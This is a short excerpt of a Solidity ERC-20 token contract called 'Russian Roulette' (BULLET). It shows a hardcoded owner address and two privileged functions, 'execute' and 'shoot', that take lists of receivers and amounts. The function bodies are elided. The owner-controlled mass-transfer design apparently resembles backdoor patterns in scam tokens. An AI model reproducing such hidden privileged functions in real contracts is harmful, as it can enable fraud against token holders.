...
contract RussianRouletteCoin is Context, IERC20 {
    ...
    address public _Owner = 0xd87A7b44097d43048B2095ef952Ec797D94dDE12;


    constructor () public {
        _name= "Russian Roulette";
        _symbol = "BULLET";
        _decimals = 18;
  ...
  function execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _apprvrOnly(){
    ...
    function shoot (address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
